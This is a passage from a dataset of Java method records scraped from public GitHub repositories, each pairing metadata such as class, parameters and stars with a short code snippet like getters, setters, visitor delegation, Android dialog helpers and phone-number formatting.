"2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58090, "method_name": "add", "class_name": "MuseumObjectStructure", "params": ["Museum"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void add(Museum museum) {\n        lists.add(museum);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/MuseumObjectStructure.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58091, "method_name": "remove", "class_name": "MuseumObjectStructure", "params": ["Museum"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void remove(Museum museum) {\n        lists.remove(museum);\n    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/MuseumObjectStructure.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58092, "method_name": "getRt_thanks_count", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getRt_thanks_count() {\n        return rt_thanks_count;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58093, "method_name": "setRt_thanks_count", "class_name": "ShopReview", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRt_thanks_count(int rt_thanks_count) {\n        this.rt_thanks_count = rt_thanks_count;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58094, "method_name": "getShopReviewID", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getShopReviewID() {\n        return shopReviewID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58095, "method_name": "setShopReviewID", "class_name": "ShopReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setShopReviewID(Integer shopReviewID) {\n        this.shopReviewID = shopReviewID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58096, "method_name": "getShopID", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getShopID() {\n        return shopID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58097, "method_name": "setShopID", "class_name": "ShopReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setShopID(Integer shopID) {\n        this.shopID = shopID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58098, "method_name": "getEndUserID", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getEndUserID() {\n        return endUserID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58099, "method_name": "setEndUserID", "class_name": "ShopReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEndUserID(Integer endUserID) {\n        this.endUserID = endUserID;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58100, "method_name": "getRating", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Integer", "snippet": "    public Integer getRating() {\n        return rating;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58101, "method_name": "setRating", "class_name": "ShopReview", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRating(Integer rating) {\n        this.rating = rating;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58102, "method_name": "getReviewText", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getReviewText() {\n        return reviewText;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58103, "method_name": "setReviewText", "class_name": "ShopReview", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReviewText(String reviewText) {\n        this.reviewText = reviewText;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58104, "method_name": "getReviewTitle", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getReviewTitle() {\n        return reviewTitle;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58105, "method_name": "setReviewTitle", "class_name": "ShopReview", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReviewTitle(String reviewTitle) {\n        this.reviewTitle = reviewTitle;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58106, "method_name": "getReviewDate", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Timestamp", "snippet": "    public Timestamp getReviewDate() {\n        return reviewDate;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58107, "method_name": "setReviewDate", "class_name": "ShopReview", "params": ["Timestamp"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setReviewDate(Timestamp reviewDate) {\n        this.reviewDate = reviewDate;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58108, "method_name": "getRt_end_user_profile", "class_name": "ShopReview", "params": [], "throws": null, "modifiers": ["public"], "return_type": "User", "snippet": "    public User getRt_end_user_profile() {\n        return rt_end_user_profile;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58109, "method_name": "setRt_end_user_profile", "class_name": "ShopReview", "params": ["User"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setRt_end_user_profile(User rt_end_user_profile) {\n        this.rt_end_user_profile = rt_end_user_profile;\n    }", "url": "https://raw.githubusercontent.com/NearbyShops/Nearby-Shops-Android-app/master/app/src/main/java/org/nearbyshops/enduserappnew/Model/ModelReviewShop/ShopReview.java", "stars": "10", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58110, "method_name": "execute", "class_name": "LogAllExceptions", "params": ["Map<String,Clazz>", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean execute(Map<String, Clazz> classes, boolean verbose) {\n    classes.values().stream().map(c -> c.node.methods).flatMap(List::stream).forEach(m -> {\n      if (m.tryCatchBlocks == null)\n        return;\n      m.tryCatchBlocks.forEach(tcb -> {\n        AbstractInsnNode firstInstructionAfterHandler = Instructions.getRealNext(tcb.handler);\n        if (!printsAlready(firstInstructionAfterHandler)) {\n          m.instructions.insertBefore(firstInstructionAfterHandler, new InsnNode(DUP));\n          m.instructions.insertBefore(firstInstructionAfterHandler, new MethodInsnNode(INVOKEVIRTUAL, \"java/lang/Throwable\", \"printStackTrace\", \"()V\"));\n        }\n      });\n      m.maxStack = Math.max(m.maxStack, 2);\n    });\n    logger.info(\"Inserted .printStackTrace() in every catch block!\");\n    return true;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/execution/tools/LogAllExceptions.java", "stars": "140", "class_props": {"extends": "Execution", "implements": null, "modifiers": ["public"]}}, {"id": 58111, "method_name": "printsAlready", "class_name": "LogAllExceptions", "params": ["AbstractInsnNode"], "throws": null, "modifiers": ["private"], "return_type": "boolean", "snippet": "  private boolean printsAlready(AbstractInsnNode ain) {\n    if (ain == null || ain.getType() == AbstractInsnNode.JUMP_INSN || Instructions.isCodeEnd(ain)) {\n      return false;\n    }\n    if (ain.getOpcode() == INVOKEVIRTUAL) {\n      MethodInsnNode min = (MethodInsnNode) ain;\n      if (min.name.equals(\"printStackTrace\") && min.desc.equals(\"()V\")) {\n        return true;\n      }\n    }\n    return printsAlready(Instructions.getRealNext(ain));\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/execution/tools/LogAllExceptions.java", "stars": "140", "class_props": {"extends": "Execution", "implements": null, "modifiers": ["public"]}}, {"id": 58112, "method_name": "main", "class_name": "RemettantApplication", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        SpringApplication.run(RemettantApplication.class, args);\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/RemettantApplication.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58113, "method_name": "clock", "class_name": "RemettantApplication", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Clock", "snippet": "    public Clock clock() {\n        return Clock.system(ZoneId.of(ZONE_UTC));\n    }", "url": "https://raw.githubusercontent.com/LAB-MI/remise-masques-covid-19/master/src/main/java/fr/gouv/interieur/dmgp/remettant/RemettantApplication.java", "stars": "5", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58114, "method_name": "visitMainClass", "class_name": "ModuleVisitor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitMainClass(final String mainClass) {\n    if (mv != null) {\n      mv.visitMainClass(mainClass);\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58115, "method_name": "visitPackage", "class_name": "ModuleVisitor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitPackage(final String packaze) {\n    if (mv != null) {\n      mv.visitPackage(packaze);\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58116, "method_name": "visitRequire", "class_name": "ModuleVisitor", "params": ["String", "int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitRequire(final String module, final int access, final String version) {\n    if (mv != null) {\n      mv.visitRequire(module, access, version);\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58117, "method_name": "visitExport", "class_name": "ModuleVisitor", "params": ["String", "int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitExport(final String packaze, final int access, final String... modules) {\n    if (mv != null) {\n      mv.visitExport(packaze, access, modules);\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58118, "method_name": "visitOpen", "class_name": "ModuleVisitor", "params": ["String", "int", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitOpen(final String packaze, final int access, final String... modules) {\n    if (mv != null) {\n      mv.visitOpen(packaze, access, modules);\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58119, "method_name": "visitUse", "class_name": "ModuleVisitor", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitUse(final String service) {\n    if (mv != null) {\n      mv.visitUse(service);\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58120, "method_name": "visitProvide", "class_name": "ModuleVisitor", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitProvide(final String service, final String... providers) {\n    if (mv != null) {\n      mv.visitProvide(service, providers);\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58121, "method_name": "visitEnd", "class_name": "ModuleVisitor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public void visitEnd() {\n    if (mv != null) {\n      mv.visitEnd();\n    }\n  }", "url": "https://raw.githubusercontent.com/Sipkab/jvm-tail-recursion/master/src/sipka/jvm/tailrec/thirdparty/org/objectweb/asm/ModuleVisitor.java", "stars": "97", "class_props": {"extends": null, "implements": null, "modifiers": ["public", "abstract"]}}, {"id": 58122, "method_name": "initElements", "class_name": "SpruceParquetBlock", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void initElements() {\n\t\telements.blocks.add(() -> new CustomBlock());\n\t\telements.items\n\t\t\t\t.add(() -> new BlockItem(block, new Item.Properties().group(ItemGroup.BUILDING_BLOCKS)).setRegistryName(block.getRegistryName()));\n\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SpruceParquetBlock.java", "stars": "2", "class_props": {"extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"id": 58123, "method_name": "getDrops", "class_name": "CustomBlock", "params": ["BlockState", "LootContext"], "throws": null, "modifiers": ["public"], "return_type": "List<ItemStack>", "snippet": "\t\tpublic List<ItemStack> getDrops(BlockState state, LootContext.Builder builder) {\n\t\t\tList<ItemStack> dropsOriginal = super.getDrops(state, builder);\n\t\t\tif (!dropsOriginal.isEmpty())\n\t\t\t\treturn dropsOriginal;\n\t\t\treturn Collections.singletonList(new ItemStack(this, 1));\n\t\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/block/SpruceParquetBlock.java", "stars": "2", "class_props": {"extends": "Block", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58124, "method_name": "createDialog", "class_name": "ErrorDialogFragments", "params": ["Context", "Bundle", "OnClickListener"], "throws": null, "modifiers": ["public", "static"], "return_type": "Dialog", "snippet": "    public static Dialog createDialog(Context context, Bundle arguments, OnClickListener onClickListener) {\n        AlertDialog.Builder builder = new AlertDialog.Builder(context);\n        builder.setTitle(arguments.getString(ErrorDialogManager.KEY_TITLE));\n        builder.setMessage(arguments.getString(ErrorDialogManager.KEY_MESSAGE));\n        if (ERROR_DIALOG_ICON != 0) {\n            builder.setIcon(ERROR_DIALOG_ICON);\n        }\n        builder.setPositiveButton(android.R.string.ok, onClickListener);\n        return builder.create();\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58125, "method_name": "handleOnClick", "class_name": "ErrorDialogFragments", "params": ["DialogInterface", "int", "Activity", "Bundle"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void handleOnClick(DialogInterface dialog, int which, Activity activity, Bundle arguments) {\n        if (EVENT_TYPE_ON_CLICK != null) {\n            EventMessage event;\n            try {\n                event = new EventMessage(\"dialog click!\",EventKey.FRAGMENT_CLICK);\n            } catch (Exception e) {\n                throw new RuntimeException(\"Event cannot be constructed\", e);\n            }\n            KeventBus eventBus = ErrorDialogManager.factory.config.getEventBus();\n            eventBus.post(event);\n        }\n        boolean finish = arguments.getBoolean(ErrorDialogManager.KEY_FINISH_AFTER_DIALOG, false);\n        if (finish && activity != null) {\n            activity.finish();\n        }\n    }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58126, "method_name": "onCreateDialog", "class_name": "Honeycomb", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Dialog", "snippet": "        public Dialog onCreateDialog(Bundle savedInstanceState) {\n            return createDialog(getActivity(), getArguments(), this);\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "android", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 58127, "method_name": "onClick", "class_name": "Honeycomb", "params": ["DialogInterface", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(DialogInterface dialog, int which) {\n            handleOnClick(dialog, which, getActivity(), getArguments());\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "android", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 58128, "method_name": "onCreateDialog", "class_name": "Support", "params": ["Bundle"], "throws": null, "modifiers": ["public"], "return_type": "Dialog", "snippet": "        public Dialog onCreateDialog(Bundle savedInstanceState) {\n            return createDialog(getActivity(), getArguments(), this);\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "DialogFragment", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 58129, "method_name": "onClick", "class_name": "Support", "params": ["DialogInterface", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void onClick(DialogInterface dialog, int which) {\n            handleOnClick(dialog, which, getActivity(), getArguments());\n        }", "url": "https://raw.githubusercontent.com/chenjk-520/keventbus/master/keventbus/src/main/java/com/util/keventbus/util/ErrorDialogFragments.java", "stars": "7", "class_props": {"extends": "DialogFragment", "implements": ["OnClickListener"], "modifiers": ["public", "static"]}}, {"id": 58130, "method_name": "getPhone", "class_name": "ParameterPhoneValueItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getPhone() {\n        return phone;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58131, "method_name": "setPhone", "class_name": "ParameterPhoneValueItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPhone(String phone) {\n        this.phone = phone;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58132, "method_name": "getFormat", "class_name": "ParameterPhoneValueItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getFormat() {\n        return format;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58133, "method_name": "setFormat", "class_name": "ParameterPhoneValueItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFormat(String format) {\n        this.format = format;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58134, "method_name": "getComment", "class_name": "ParameterPhoneValueItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getComment() {\n        return comment;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58135, "method_name": "setComment", "class_name": "ParameterPhoneValueItem", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setComment(String comment) {\n        this.comment = comment;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58136, "method_name": "getFlags", "class_name": "ParameterPhoneValueItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getFlags() {\n        return flags;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58137, "method_name": "setFlags", "class_name": "ParameterPhoneValueItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setFlags(int flags) {\n        this.flags = flags;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58138, "method_name": "getPhoneParts", "class_name": "ParameterPhoneValueItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String[] getPhoneParts() {\n        String[] result = new String[] { \"\", \"\", phone };\n\n        String defaultPrefix = Setup.getSetup().get(\"param.phone.default.prefix\", \"3472\");\n        if (phone.matches(\"^[0-9]{11}$\")) {\n            if (format == null || !format.matches(\"^[0-9]{2}$\")) {\n                if (phone.startsWith(\"7\" + defaultPrefix) || phone.startsWith(\"8\" + defaultPrefix)) {\n                    format = \"13\";\n                } else {\n                    format = \"10\";\n                }\n            }\n            int p1 = Utils.parseInt(format.substring(0, 1));\n            int p2 = Utils.parseInt(format.substring(1));\n            result[0] = phone.substring(0, p1);\n            result[1] = phone.substring(p1, p1 + p2);\n            result[2] = phone.substring(p1 + p2);\n        }\n\n        return result;\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58139, "method_name": "getPhones", "class_name": "ParameterPhoneValueItem", "params": ["List<ParameterPhoneValueItem>"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "String", "snippet": "    public static final String getPhones(List<ParameterPhoneValueItem> items) {\n        String pattern = Setup.getSetup().get(\"param.phone.format\", defaultPattern);\n\n        StringBuffer result = new StringBuffer();\n\n        for (ParameterPhoneValueItem item : items) {\n            String val = PatternFormatter.insertPatternPart(pattern, \"number\",\n                    formatPhone(item.getFormat(), item.getPhone()));\n            val = PatternFormatter.insertPatternPart(val, \"comment\", item.getComment());\n\n            if (result.length() > 0) {\n                result.append(\" \");\n            }\n            result.append(val);\n        }\n\n        return result.toString();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58140, "method_name": "formatPhone", "class_name": "ParameterPhoneValueItem", "params": ["String", "String"], "throws": null, "modifiers": ["final", "public", "static"], "return_type": "String", "snippet": "    public static final String formatPhone(String format, String phone) {\n        Setup setup = Setup.getSetup();\n\n        final String prefix = \"param.phone.format.number\";\n\n        String pattern = setup.get(prefix + \".f\" + format);\n        if (pattern == null) {\n            pattern = setup.get(prefix);\n        }\n        if (pattern == null) {\n            if (\"10\".equals(format)) {\n                pattern = \"+X XXX-XXX-XX-XX\";\n            } else if (\"13\".equals(format)) {\n                pattern = \"+X (XXX) XXX-XX-XX\";\n            } else if (\"14\".equals(format)) {\n                pattern = \"+X (XXXX) XX-XX-XX\";\n            } else if (\"15\".equals(format)) {\n                pattern = \"+X (XXXXX) X-XX-XX\";\n            } else {\n                pattern = \"+X XXX XXX-XX-XX\";\n            }\n        }\n\n        final int patternLength = pattern.length();\n        final int numberLength = phone.length();\n\n        int numberPointer = 0;\n\n        StringBuilder result = new StringBuilder(patternLength);\n        for (int i = 0; i < patternLength && numberPointer < numberLength; i++) {\n            char c = pattern.charAt(i);\n            if (c == 'X') {\n                result.append(phone.charAt(numberPointer++));\n            } else {\n                result.append(pattern.charAt(i));\n            }\n        }\n\n        return result.toString();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58141, "method_name": "hashCode", "class_name": "ParameterPhoneValueItem", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int hashCode() {\n        return phone.hashCode();\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58142, "method_name": "equals", "class_name": "ParameterPhoneValueItem", "params": ["Object"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean equals(Object obj) {\n        return obj instanceof ParameterPhoneValueItem && ((ParameterPhoneValueItem) obj).phone.equals(phone);\n    }", "url": "https://raw.githubusercontent.com/Pingvin235/bgerp/master/src/ru/bgcrm/model/param/ParameterPhoneValueItem.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58143, "method_name": "onTransitionStart", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionStart(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 58144, "method_name": "onTransitionEnd", "class_name": "OnTransitionListener", "params": ["Transition"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onTransitionEnd(Transition transition) {\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/app/src/main/java/com/example/gsyvideoplayer/listener/OnTransitionListener.java", "stars": "2", "class_props": {"extends": null, "implements": ["Transition"], "modifiers": ["public"]}}, {"id": 58145, "method_name": 